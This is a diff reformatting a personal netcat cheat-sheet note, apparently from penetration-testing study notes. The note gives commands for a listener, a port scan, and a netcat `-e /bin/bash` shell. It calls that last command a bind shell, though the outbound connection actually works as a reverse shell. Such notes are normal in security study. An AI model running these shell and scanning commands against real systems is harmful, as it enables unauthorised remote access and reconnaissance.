@@ -9,9 +9,12 @@ windows executables: https://github.com/int0x33/nc.exe/
 more sophisticated alternative: [[3 Tools/shells/Socat]]
 
 # Usage
-start listener: `nc -lnvp <port>
-connect to machine: `nc <target-ip> <chosen-port>`
-start bin shell running bash: `nc -nv <target-ip> <chosen-port> -e /bin/bash`
+start listener:
+`nc -lnvp <port>
+connect to machine:
+`nc <target-ip> <chosen-port>`
+start bind shell running bash:
+`nc -nv <target-ip> <chosen-port> -e /bin/bash`
 
 can also be used for **port scanning**:
 - TCP Scan: `nc -nvv -w 1 -z [IP] [START_PORT-END_PORT]`
